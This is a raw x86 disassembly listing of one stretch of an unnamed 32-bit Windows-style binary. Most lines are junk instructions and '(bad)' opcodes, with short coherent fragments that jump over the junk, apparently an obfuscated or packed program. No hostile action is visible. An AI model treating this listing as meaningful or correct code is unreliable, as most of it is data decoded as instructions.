  4050c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050c4:	pop    esi
  4050c5:	pop    edi
  4050c6:	mov    ds:0x814c0644,ax
  4050cc:	pop    DWORD PTR ds:0xb37fd3d7
  4050d2:	pop    esi
  4050d3:	call   FWORD PTR [ecx]
  4050d5:	or     ch,al
  4050d7:	push   edx
  4050d8:	cmp    ch,BYTE PTR [ebx+0x552a3b9b]
  4050de:	mov    WORD PTR [ebx+eiz*2-0xc5b9af4],fs
  4050e5:	idiv   bh
  4050e7:	cs pushf 
  4050e9:	mov    al,0xba
  4050eb:	lds    edx,FWORD PTR [ebx+eiz*2+0x3c6248d3]
  4050f2:	and    DWORD PTR [ecx],0x1c04ee02
  4050f8:	mov    ss,WORD PTR [eax-0x66a72cf4]
  4050fe:	test   BYTE PTR [edx],ah
  405100:	jb     0x405165
  405102:	aad    0x1
  405104:	add    ch,BYTE PTR [eax+0x70185e21]
  40510a:	int    0x86
  40510c:	sub    ebx,edx
  40510e:	stc    
  40510f:	lahf   
  405110:	int3   
  405111:	adc    DWORD PTR es:[eax-0x3d],0xffffffcc
  405116:	pop    ebx
  405117:	sub    ecx,DWORD PTR [ecx+0x12]
  40511a:	aad    0x8
  40511c:	sbb    eax,DWORD PTR [edi-0x42]
  40511f:	push   0x5b8acbf8
  405124:	in     eax,dx
  405125:	add    dl,BYTE PTR [eax+0x58]
  405128:	xchg   esp,eax
  405129:	mov    al,0x43
  40512b:	daa    
  40512c:	and    DWORD PTR gs:[edx+0x2a],edi
  405130:	xor    DWORD PTR [ecx],ebp
  405132:	mov    esp,0x12cecb8c
  405137:	push   es
  405138:	dec    DWORD PTR [esi]
  40513a:	cmp    dh,BYTE PTR [edx+0x33]
  40513d:	(bad)  
  40513e:	fsubr  st,st(6)
  405140:	mov    ebx,0x4de1761f
  405145:	arpl   dx,bx
  405147:	and    eax,0x9084f9aa
  40514c:	jle    0x4051a4
  40514e:	out    dx,al
  40514f:	mov    cl,0x37
  405151:	jecxz  0x40518f
  405153:	not    DWORD PTR [eax-0x39]
  405156:	add    eax,0x412358
  40515b:	adc    BYTE PTR [eax],al
  40515d:	add    BYTE PTR [eax],al
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi-0x3cf0698e]
  4051c5:	inc    edx
  4051c6:	jmp    0x40519d
  4051c8:	dec    edx
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x40517b
  4051d1:	mov    ebx,0x8ab37501
  4051d6:	inc    edi
  4051d7:	inc    eax
  4051d8:	repz or DWORD PTR [esi+0x446e619a],ebp
  4051df:	lods   al,BYTE PTR ds:[esi]
  4051e0:	pusha  
  4051e1:	xchg   edi,eax
  4051e2:	push   ss
  4051e3:	sub    al,0x81
  4051e5:	and    ah,BYTE PTR [edx]
  4051e7:	imul   esp,DWORD PTR [ecx+0x2a],0x439a2038
  4051ee:	dec    ebx
  4051ef:	push   0xd5ab7b66
  4051f4:	aad    0x21
  4051f6:	cli    
  4051f7:	lock adc dl,0x90
  4051fb:	xchg   DWORD PTR [esi],edi
  4051fd:	and    eax,0x4c96ef15
  405202:	loope  0x4051b9
  405204:	push   edi
  405205:	mov    ebp,0x818730b1
  40520a:	mov    ebx,ss
  40520c:	mov    ebp,0xabdb7d1a
  405211:	push   eax
  405212:	inc    ebp
  405213:	xchg   edi,eax
  405214:	mov    edi,0xd702776c
  405219:	repnz sbb esp,ebp
  40521c:	adc    dl,al
  40521e:	call   0x11993958
  405223:	pop    eax
  405224:	enter  0x2913,0x7c
  405228:	cmp    DWORD PTR [ebp+0x6f],0x8ef53bc9
  40522f:	lds    ecx,FWORD PTR [edi+0x376688fc]
  405235:	repnz mov ds:0x256e5a74,al
  40523b:	(bad)  
  40523c:	pop    esp
  40523d:	mov    al,ds:0x54b82e01
  405242:	inc    edx
  405243:	hlt    
  405244:	mov    bh,0x1a
  405246:	ss dec edi
  405248:	inc    ebp
  405249:	repz dec ebp
  40524b:	scas   al,BYTE PTR es:[edi]
  40524c:	sbb    edx,DWORD PTR [eax+0xb]
  40524f:	pop    esp
  405250:	jo     0x4051e5
  405252:	add    BYTE PTR [eax-0x1e],ah
  405255:	sub    BYTE PTR [edx+0x5d3e4b39],dl
  40525b:	xor    esp,DWORD PTR ds:0x4fc82058
  405261:	pop    ss
  405262:	leave  
  405263:	cli    
  405264:	arpl   dx,si
  405266:	inc    edi
  405267:	in     eax,0xb5
  405269:	sar    DWORD PTR [edi+0x30a19922],1
  40526f:	mul    DWORD PTR [ebx]
  405271:	repz pop es
  405273:	(bad)  
  405275:	sub    BYTE PTR [eax+0x8c81f28],0x1f
  40527c:	or     DWORD PTR [ebp+0x49],ebp
  40527f:	addr16 jmp 0x4052d3
  405282:	rol    edx,0x79
  405285:	lods   al,BYTE PTR ds:[esi]
  405286:	xchg   edx,eax
  405287:	repnz or al,0x4f
  40528a:	rcl    ebx,cl
  40528c:	outs   dx,BYTE PTR ds:[esi]
  40528d:	leave  
  40528e:	daa    
  40528f:	rcr    BYTE PTR [edx-0x18b1c9a9],0x92
  405296:	mov    ecx,DWORD PTR [eax]
  405298:	add    ch,bl
  40529a:	xor    DWORD PTR [edi-0x9],0x24
  40529e:	sub    al,0x52
  4052a0:	push   0x31cf1a3d
  4052a5:	ds inc ecx
  4052a7:	sbb    eax,DWORD PTR [esp+edx*4+0x6c]
  4052ab:	mov    eax,ds:0xe46ec313
  4052b0:	jae    0x4052bf
  4052b2:	add    ebp,DWORD PTR [edi-0x7c15490e]
  4052b8:	push   edx
  4052b9:	(bad)  
  4052ba:	rcr    DWORD PTR [eax],0x32
  4052bd:	push   edi
  4052be:	cmp    al,0x1d
  4052c0:	inc    esp
  4052c1:	or     dh,BYTE PTR [ecx]
  4052c3:	lock ins BYTE PTR es:[edi],dx
  4052c5:	or     eax,0x5860ade4
  4052ca:	push   cs
  4052cb:	mov    ds:0xb3885be9,eax
  4052d0:	rol    ah,cl
  4052d2:	ss cmp eax,esp
  4052d5:	push   edi
  4052d6:	push   ebx
  4052d7:	sub    ecx,DWORD PTR [edi]
  4052d9:	call   0x787e:0xb8fd1b66
  4052e0:	dec    esi
  4052e1:	test   ecx,ecx
  4052e3:	inc    ebx
  4052e4:	test   cl,bh
  4052e6:	push   0xb3f34041
  4052eb:	sbb    edx,DWORD PTR [eax+edi*4]
  4052ee:	adc    BYTE PTR [ecx+0x52],al
  4052f1:	out    dx,eax
  4052f2:	push   0xc7a5d383
  4052f7:	mov    bh,0xd3
  4052f9:	push   ebx
  4052fa:	leave  
  4052fb:	jg     0x405369
  4052fd:	lock dec ecx
  4052ff:	mov    esp,0x933887a5
  405304:	sub    bh,BYTE PTR [eax]
  405306:	loop   0x4052d2
  405308:	push   eax
  405309:	out    dx,al
  40530a:	stc    
  40530b:	push   0x9b665bd5
  405310:	loopne 0x4052d0
  405312:	adc    eax,0xdda025f2
  405317:	fwait
  405318:	clc    
  405319:	dec    esp
  40531a:	mov    BYTE PTR [esi+0x55],ah
  40531d:	cmp    bl,BYTE PTR [edi+ebx*2+0x33]
  405321:	add    bl,bh
  405323:	xchg   esp,ecx
  405325:	jp     0x405389
  405327:	jne    0x4052e0
  405329:	repz imul ebx,DWORD PTR [ebx+0x50],0x8df875ff
  405331:	inc    ebp
  405332:	mov    BYTE PTR [eax-0x1],dl
  405335:	jne    0x40532b
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	sub    DWORD PTR [ecx],edi
  40534d:	cdq    
  40534e:	mov    al,0x16
  405350:	jbe    0x4053d0
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x405323
  405358:	(bad)  
  405359:	fcomp  st(4)
  40535b:	mov    bh,0xb6
  40535d:	js     0x4053a3
  40535f:	push   esi
  405360:	add    BYTE PTR [ebx-0x46a752e3],ch
  405366:	std    
  405367:	adc    eax,0x64d81bf0
  40536c:	push   eax
  40536d:	repnz sub al,0x94
  405370:	pushf  
  405371:	dec    esi
  405372:	jle    0x40536c
  405374:	push   esp
  405375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405376:	pop    edx
  405377:	jecxz  0x4053c3
  405379:	rol    BYTE PTR ds:0x12e8a7c9,cl
  40537f:	cli    
  405380:	sub    al,0x36
  405382:	stos   DWORD PTR es:[edi],eax
  405383:	push   0xb978920a
  405388:	(bad)  
  405389:	jmp    0x40531e
  40538b:	mov    ecx,0xf8214016
  405390:	stos   DWORD PTR es:[edi],eax
  405391:	clc    
  405392:	fist   DWORD PTR [eax]
  405394:	pop    esp
  405395:	(bad)  
  405396:	mov    ah,0x4c
  405398:	mov    esp,0xf9dd7fba
  40539d:	aas    
  40539e:	inc    ecx
  40539f:	fwait
  4053a0:	ds mov esp,0xeeff1edc
  4053a6:	jp     0x405351
  4053a8:	xchg   DWORD PTR [eax-0x62bbd3f],ebx
  4053ae:	pop    ebx
  4053af:	mov    dl,0x2e
  4053b1:	xchg   ecx,eax
  4053b2:	mov    bh,0xf7
  4053b4:	mov    BYTE PTR [edx-0x6a695db1],al
  4053ba:	je     0x405385
  4053bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053bd:	sub    bh,BYTE PTR [eax+0x62]
  4053c0:	ins    DWORD PTR es:[edi],dx
  4053c1:	lods   al,BYTE PTR ds:[esi]
  4053c2:	leave  
  4053c3:	and    al,0x40
  4053c5:	test   BYTE PTR [eax],bh
  4053c7:	mov    edi,0x6999621c
  4053cc:	(bad)  
  4053cd:	mov    ebx,0xb3567161
  4053d2:	xor    al,0x3d
  4053d4:	in     eax,dx
  4053d5:	dec    BYTE PTR [edi+0x24]
  4053d8:	out    dx,eax
  4053d9:	rcr    DWORD PTR [eax-0x3504b122],cl
  4053df:	push   edi
  4053e0:	or     eax,0xdecce8cc
  4053e5:	mul    BYTE PTR [eax]
  4053e7:	push   ecx
  4053e8:	mov    ebp,0x44e75b4c
  4053ed:	(bad)  
  4053ee:	dec    BYTE PTR [ecx+0x10d3050d]
  4053f4:	test   BYTE PTR [ebp+eiz*8-0x6877143d],dl
  4053fb:	stc    
  4053fc:	std    
  4053fd:	cmp    esp,ecx
  4053ff:	(bad)  
  405400:	fmul   DWORD PTR [ecx+0x7d48ed9c]
  405406:	fist   WORD PTR [eax-0x5c]
  405409:	call   0x2dd9:0xcfff9222
  405410:	imul   esp,DWORD PTR [esi-0x22],0x9d7756e1
  405417:	mov    ds:0x53f82ed3,eax
  40541c:	sbb    al,0x2f
  40541e:	shl    dl,0x97
  405421:	div    BYTE PTR [eax-0x725e13e2]
  405427:	lods   eax,DWORD PTR fs:[esi]
  405429:	int    0x5b
  40542b:	out    0xbc,al
  40542d:	cmp    DWORD PTR [esi-0x28],esi
  405430:	repnz cmc 
  405432:	stc    
  405433:	push   eax
  405434:	sbb    al,0x20
  405436:	adc    BYTE PTR [ebp-0x6b],ah
  405439:	xchg   ebp,eax
  40543a:	cmp    esi,edi
  40543c:	or     ecx,esp
  40543e:	fwait
  40543f:	pop    es
  405440:	xchg   esp,eax
  405442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405443:	lods   eax,DWORD PTR ds:[esi]
  405444:	xor    al,0xbe
  405446:	xchg   esi,eax
  405447:	dec    esp
  405448:	or     BYTE PTR [ebx],0x2
  40544b:	scas   eax,DWORD PTR es:[edi]
  40544c:	leave  
  40544d:	push   ebx
  40544e:	fs je  0x405429
  405451:	or     eax,0x4694a46c
  405456:	mov    bl,BYTE PTR [eax+0x16]
  405459:	leave  
  40545a:	push   ecx
  40545b:	ficom  DWORD PTR [ebp+0x20]
  40545e:	and    BYTE PTR [ebx+0x68bcb7d],dl
  405464:	add    DWORD PTR [eax+0x54],esp
  405467:	ret    0x26ae
  40546a:	mov    ebp,fs
  40546c:	and    eax,0x6a24d19f
  405471:	ins    BYTE PTR es:[edi],dx
  405472:	push   edx
  405473:	sub    eax,0x9b1e0d47
  405478:	mov    bh,BYTE PTR [edx-0x109818f8]
  40547e:	out    0xe7,al
  405480:	nop
  405481:	arpl   WORD PTR [ebp+0x67],sp
  405484:	cmp    bl,BYTE PTR [esi-0x38]
  405487:	push   0x3b
  405489:	xor    dl,BYTE PTR [ecx-0x4a]
  40548c:	mov    al,0xc4
  40548e:	jmp    0x40548a
  405490:	fld    QWORD PTR [esi+edx*2-0x17]
  405494:	enter  0xbd7f,0xb8
  405498:	push   esi
  405499:	dec    esi
  40549a:	inc    eax
  40549b:	sub    BYTE PTR [ebx],cl
  40549d:	mov    al,BYTE PTR [ebx+0x5bd8ed0]
  4054a3:	cmp    DWORD PTR [edi+eiz*4-0x2f],0x51
  4054a8:	xchg   edx,eax
  4054a9:	lods   al,BYTE PTR ds:[esi]
  4054aa:	xchg   ebp,eax
  4054ab:	out    0xd0,eax
  4054ad:	fdiv   DWORD PTR [edi]
  4054af:	push   edi
  4054b0:	xchg   ebx,eax
  4054b1:	or     esp,DWORD PTR [edx+0x414fe8]
  4054b7:	add    BYTE PTR [ebp+0x25840fc0],al
  4054bd:	add    BYTE PTR [eax],al
  4054bf:	add    BYTE PTR [ebp-0x74af77bb],cl
  4054c5:	inc    ebp
  4054c6:	in     al,dx
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi+0x1b],0xffffffe8
  40550f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405510:	shl    dl,0x77
  405513:	jle    0x405593
  405515:	fidivr DWORD PTR [edi+0x7e]
  405518:	jle    0x4054b9
  40551a:	mov    dl,0x81
  40551c:	js     0x405519
  40551e:	jns    0x405570
  405520:	xor    al,0xbe
  405522:	repz inc esi
  405524:	test   dl,ch
  405526:	mov    ch,0xcd
  405528:	cmp    dl,BYTE PTR [ecx-0x5c24f607]
  40552e:	lods   al,BYTE PTR ds:[esi]
  40552f:	fisttp WORD PTR [edi+0x1ae9a8fe]
  405535:	xor    BYTE PTR [esi+0x4e989e7e],dl
  40553b:	adc    ch,BYTE PTR [ebp-0x31b918a7]
  405541:	mov    al,0x35
  405543:	jae    0x405593
  405545:	jg     0x40556b
  405547:	dec    ecx
  405548:	jb     0x405597
  40554a:	arpl   WORD PTR [esi],dx
  40554c:	xchg   ebp,eax
  40554d:	xor    ah,cl
  40554f:	nop
  405550:	bound  esp,QWORD PTR [edi+edi*1-0x408a2359]
  405557:	ja     0x405521
  405559:	mov    bl,0x8
  40555b:	jge    0x40558d
  40555d:	shl    DWORD PTR [edi-0x31],0x8a
  405561:	inc    esi
  405562:	ins    BYTE PTR es:[edi],dx
  405563:	out    dx,eax
  405564:	fs adc al,0xc9
  405567:	mov    ecx,0xb1185b51
  40556c:	loope  0x40556e
  40556e:	push   cs
  40556f:	cwde   
  405570:	mov    ebp,0x7cb3a0ed
  405575:	test   al,0x97
  405577:	push   DWORD PTR [edx]
  405579:	add    eax,0x5eb4d8a8
  40557e:	fwait
  40557f:	push   0x77
  405581:	xor    bh,BYTE PTR [eax+0x7271cd89]
  405587:	dec    ebp
  405588:	ds daa 
  40558a:	mov    al,0x3
  40558c:	sbb    DWORD PTR ds:0x737c02af,0x5f
  405593:	cdq    
  405594:	fs pop es
  405596:	inc    edx
  405597:	jae    0x40557b
  405599:	arpl   di,bp
  40559b:	jo     0x4055aa
  40559d:	pop    ss
  40559e:	pop    ebx
  40559f:	mov    edi,0x5f8fcae4
  4055a4:	(bad)  
  4055a5:	addr16 dec ecx
  4055a7:	and    al,dl
  4055a9:	push   ss
  4055aa:	dec    ebp
  4055ab:	sbb    ah,BYTE PTR ds:0xa240e506
  4055b1:	(bad)  
  4055b2:	and    al,0x21
  4055b4:	jb     0x405614
  4055b6:	sahf   
  4055b7:	test   DWORD PTR [esi-0x43],ebx
  4055ba:	pop    edx
  4055bb:	cmp    edx,DWORD PTR [edi]
  4055bd:	test   al,0x7a
  4055bf:	aad    0xf4
  4055c1:	fnstcw WORD PTR [edi-0x6eea191f]
  4055c7:	fistp  QWORD PTR [edi+0x11]
  4055ca:	loopne 0x405604
  4055cc:	and    DWORD PTR [ecx],edi
  4055ce:	add    ebp,DWORD PTR ds:0xb71351d7
  4055d4:	cld    
  4055d5:	lds    ebp,FWORD PTR [esi+0x76]
  4055d8:	inc    ebx
  4055d9:	imul   eax,esi,0x1b105a16
  4055df:	fistp  WORD PTR ds:0xa988c9ad
  4055e5:	call   0x2bcfec8b
  4055ea:	sub    esp,0x6ce9251a
  4055f0:	cdq    
  4055f1:	(bad)  [ecx]
  4055f3:	xchg   ebp,eax
  4055f4:	(bad)  
  4055f6:	jno    0x40563d
  4055f8:	inc    ecx
  4055f9:	sub    BYTE PTR [ebp+0x67555146],dh
  4055ff:	sbb    ah,BYTE PTR [eax]
  405601:	scas   eax,DWORD PTR es:[edi]
  405602:	(bad)  
  405603:	(bad)  
  405604:	(bad)  [edi-0x4f]
  405607:	nop
  405608:	lahf   
  405609:	ins    DWORD PTR es:[edi],dx
  40560a:	xchg   edi,eax
  40560b:	nop
  40560c:	aad    0x82
  40560e:	mov    al,ds:0x10f15e2a
  405613:	into   
  405614:	cli    
  405615:	push   cs
  405616:	cld    
  405617:	imul   eax,eax,0x3a
  40561a:	mov    dh,0xbe
  40561c:	popw   ss
  40561e:	stos   BYTE PTR es:[edi],al
  40561f:	repz repnz mov dh,0xb9
  405623:	data16 (bad) 
  405625:	ds test eax,0x47e32cf4
  40562b:	hlt    
  40562c:	fwait
  40562d:	pop    edx
  40562e:	cmp    dh,BYTE PTR [eax]
  405630:	xlat   BYTE PTR ds:[ebx]
  405631:	fmulp  st(2),st
  405633:	sahf   
  405634:	loop   0x4055c6
  405636:	xlat   BYTE PTR ds:[ebx]
  405637:	sti    
  405638:	das    
  405639:	jmp    0x405629
  40563b:	mov    edi,0x135cebdd
  405640:	out    dx,al
  405641:	retf   
  405642:	jns    0x4055dc
  405644:	lahf   
  405645:	mov    bl,0xe7
  405647:	sbb    esi,0xb71f41d2
  40564d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40564e:	or     al,0x70
  405650:	mov    WORD PTR [edx-0x5ff89504],cs
  405656:	and    DWORD PTR [ebp-0x5c488b8],ecx
  40565c:	pop    ss
  40565d:	sub    al,0x2e
  40565f:	pop    ds
  405660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405661:	in     al,0x89
  405663:	jo     0x4055ee
  405665:	out    dx,eax
  405666:	jg     0x405672
  405668:	pop    ecx
  405669:	leave  
  40566a:	mov    edx,0x9d8b54ee
  40566f:	fcmovb st,st(3)
  405671:	iret   
  405672:	retf   
  405673:	sbb    edx,DWORD PTR [ebx-0x75feb777]
  405679:	inc    ebp
  40567a:	dec    DWORD PTR [ebx+0x4a34f84d]
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	push   ss
  4056a1:	adc    cl,BYTE PTR [edi]
  4056a3:	mov    al,0x5e
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x405705
  4056ad:	int3   
  4056ae:	dec    ebp
  4056af:	add    BYTE PTR [edi],bl
  4056b1:	xchg   BYTE PTR [ebp-0x29],cl
  4056b4:	and    al,0xf5
  4056b6:	xchg   ebp,eax
  4056b7:	sbb    eax,0x99c1964e
  4056bc:	mov    eax,0x40f38218
  4056c1:	mov    edx,0x87e03d80
  4056c6:	push   0x991c5ec4
  4056cb:	pop    eax
  4056cc:	and    cl,BYTE PTR [esi]
  4056ce:	push   esp
  4056cf:	jg     0x40573f
  4056d1:	and    al,0x4b
  4056d3:	stos   DWORD PTR es:[edi],eax
  4056d4:	andps  xmm1,xmm4
  4056d7:	dec    ecx
  4056d8:	inc    ecx
  4056d9:	adc    edx,DWORD PTR [esi-0x1b]
  4056dc:	mov    ds:0x229c1d53,eax
  4056e1:	mov    bl,0x4a
  4056e3:	retf   
  4056e4:	xor    dl,bl
  4056e6:	mov    edx,0xcc61868f
  4056eb:	sti    
  4056ec:	jbe    0x4056bb
  4056ee:	test   BYTE PTR [edi-0x7c],bl
  4056f1:	repnz sub DWORD PTR [eax-0x4b5c37c8],eax
  4056f8:	or     al,0x99
  4056fa:	popf   
  4056fb:	arpl   WORD PTR [ecx+0x0],di
  4056fe:	xlat   BYTE PTR ds:[ebx]
  4056ff:	or     al,bh
  405701:	pop    ebx
  405702:	int3   
  405703:	clc    
  405704:	xor    ebx,DWORD PTR [esp+ebp*4]
  405707:	jae    0x40570b
  405709:	xchg   BYTE PTR [eax+edx*8],al
  40570c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40570d:	(bad)  
  40570e:	xchg   edi,eax
  40570f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405711:	dec    esi
  405712:	stos   BYTE PTR es:[edi],al
  405713:	push   edx
  405714:	jge    0x4056c0
  405716:	and    bh,ah
  405718:	into   
  405719:	or     al,0xfc
  40571b:	xchg   edi,eax
  40571c:	mov    eax,ds:0xa9c63b74
  405721:	adc    ebp,DWORD PTR [ebx]
  405723:	or     ebx,0x1d
  405726:	pop    esi
  405727:	cli    
  405728:	into   
  405729:	xchg   edi,eax
  40572a:	dec    edx
  40572b:	fs add esp,ecx
  40572e:	in     eax,dx
  40572f:	mov    edx,0xbfdb135e
  405734:	add    DWORD PTR [ebx-0x78],0x9ee2a616
  40573b:	sbb    dh,ch
  40573d:	test   BYTE PTR [edx],0x4
  405740:	shl    DWORD PTR [esi],1
  405742:	mov    edx,?
  405744:	rcl    BYTE PTR [ecx+ebx*8+0x4c],0x99
  405749:	je     0x4057a2
  40574b:	inc    eax
  40574c:	jecxz  0x4056ee
  40574e:	dec    edx
  40574f:	inc    ecx
  405750:	imul   ebx,edx,0x63
  405753:	cwde   
  405754:	dec    ecx
  405755:	lods   al,BYTE PTR ds:[esi]
  405756:	xchg   ebx,eax
  405757:	jmp    0x62c:0x8567e342
  40575e:	sbb    edx,DWORD PTR [edi-0x1e781704]
  405764:	imul   edi,DWORD PTR ds:0x3f2156cd,0xcabf2f8b
  40576e:	xor    DWORD PTR [edi-0x9515a90],ebp
  405774:	gs inc edx
  405776:	mov    cl,0xc6
  405778:	jb     0x405700
  40577a:	(bad)  
  40577d:	mov    ds,WORD PTR [edx+0x4c]
  405780:	shl    BYTE PTR [esi],cl
  405782:	pusha  
  405783:	enter  0x50dd,0x9c
  405787:	stc    
  405788:	adc    ch,ah
  40578a:	pop    DWORD PTR [ecx]
  40578c:	aam    0xc0
  40578e:	iret   
  40578f:	mov    esp,0xdbfe61c0
  405794:	and    DWORD PTR [edi],esi
  405796:	push   ss
  405797:	fisttp DWORD PTR [ecx-0x73e25d13]
  40579d:	add    ebp,DWORD PTR [ebp+0x2e]
  4057a0:	fwait
  4057a1:	test   al,0x1d
  4057a3:	in     eax,dx
  4057a4:	(bad)  
  4057a5:	retf   
  4057a6:	sahf   
  4057a7:	clc    
  4057a8:	mov    ebx,0xcc35aba0
  4057ad:	lahf   
  4057ae:	jo     0x4057d1
  4057b0:	push   ecx
  4057b1:	adc    ebx,esi
  4057b3:	xchg   esp,eax
  4057b4:	push   ecx
  4057b5:	cwde   
  4057b6:	leave  
  4057b7:	shl    BYTE PTR [esi],cl
  4057b9:	xchg   ebp,eax
  4057ba:	test   DWORD PTR [esi],esi
  4057bc:	lock dec esi
  4057be:	sub    eax,0xca557f84
  4057c4:	imul   ecx,ebp,0x6
  4057c7:	sub    edx,DWORD PTR [edx+0x7e]
  4057ca:	and    eax,0x73a60402
  4057cf:	jne    0x4057f1
  4057d1:	dec    eax
  4057d2:	jae    0x4057e0
  4057d4:	and    eax,0x52473dfc
  4057da:	(bad)  
  4057db:	pop    ss
  4057dc:	pop    es
  4057dd:	dec    edx
  4057de:	in     al,dx
  4057df:	mov    ch,0x88
  4057e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e2:	inc    edx
  4057e3:	push   eax
  4057e4:	sub    DWORD PTR [edx-0x69374f04],esp
  4057ea:	mov    eax,0x1e27a88e
  4057ef:	xchg   ebp,eax
  4057f0:	add    DWORD PTR ds:0x429a8097,ebx
  4057f6:	(bad)  
  4057f7:	sub    eax,0x2d4f1d3b
  4057fc:	mov    ecx,DWORD PTR [esp+ecx*1]
  4057ff:	jne    0x405860
  405801:	sbb    BYTE PTR [edi],dh
  405803:	(bad)  
  405804:	fsubr  DWORD PTR [edi]
  405806:	sti    
  405807:	aad    0xfe
  405809:	or     bh,bh
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	jg     0x4058a0
  405858:	or     DWORD PTR [ecx+0x7e7e0a3a],0x7e7e7fda
  405862:	and    ebx,DWORD PTR [edi+0x4cbbe1e3]
  405868:	rol    ebp,cl
  40586a:	cmp    ecx,DWORD PTR [edx]
  40586c:	jns    0x4058c5
  40586e:	pop    eax
  40586f:	sub    al,0x60
  405871:	jb     0x40587b
  405873:	add    esi,edx
  405875:	test   al,0x85
  405877:	ins    DWORD PTR es:[edi],dx
  405878:	aam    0x97
  40587a:	lds    ecx,FWORD PTR [ebp+0x3919c74a]
  405880:	or     BYTE PTR [eax],dl
  405882:	nop
  405883:	sub    BYTE PTR [ecx-0x3e],bl
  405886:	out    0x45,eax
  405888:	inc    ecx
  405889:	mov    edx,0x13bc5ee7
  40588e:	sbb    BYTE PTR [eax],bl
  405890:	xor    ebp,DWORD PTR ds:0xfe8e8f08
  405896:	adc    ch,BYTE PTR [esi-0x7ac1a259]
  40589c:	mov    ecx,DWORD PTR [ebx]
  40589e:	hlt    
  40589f:	jae    0x405851
  4058a1:	jb     0x40585f
  4058a3:	mov    al,0x64
  4058a5:	ret    0x6aa
  4058a8:	dec    esi
  4058a9:	jnp    0x4058ec
  4058ab:	addr16 xchg esp,eax
  4058ad:	popf   
  4058ae:	xchg   ecx,eax
  4058af:	inc    edi
  4058b0:	adc    al,0x9f
  4058b2:	mov    edi,DWORD PTR [edi+0x1b]
  4058b5:	mov    ch,0xa6
  4058b7:	dec    ebx
  4058b8:	inc    ebx
  4058b9:	mov    ds:0x7a01ea07,eax
  4058be:	dec    esp
  4058bf:	sbb    esi,DWORD PTR [esi]
  4058c1:	mov    DWORD PTR [esi],ebp
  4058c3:	xor    dl,BYTE PTR [ebx]
  4058c5:	(bad)  
  4058c7:	lods   eax,DWORD PTR ds:[esi]
  4058c8:	jl     0x405929
  4058ca:	(bad)  
